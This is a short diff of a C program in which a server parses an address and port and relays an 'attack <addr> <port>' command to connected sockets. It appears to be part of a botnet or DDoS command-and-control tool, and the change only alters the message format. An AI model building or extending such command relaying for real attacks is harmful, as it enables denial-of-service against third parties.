@@ -191,9 +191,9 @@ int main()
                             cmd = strsep(&data," ");
                             addr = strsep(&data," ");
                             port = strsep(&data," ");
-                            strcat(send_buf, "start attacking ");
+                            strcat(send_buf, "attack ");
 			    strcat(send_buf, addr);
-			    strcat(send_buf, ":");
+			    strcat(send_buf, " ");
                             strcat(send_buf, port);
                             for (tmp_j = sockfd + 1; tmp_j <= max_fd; tmp_j++)
                             {
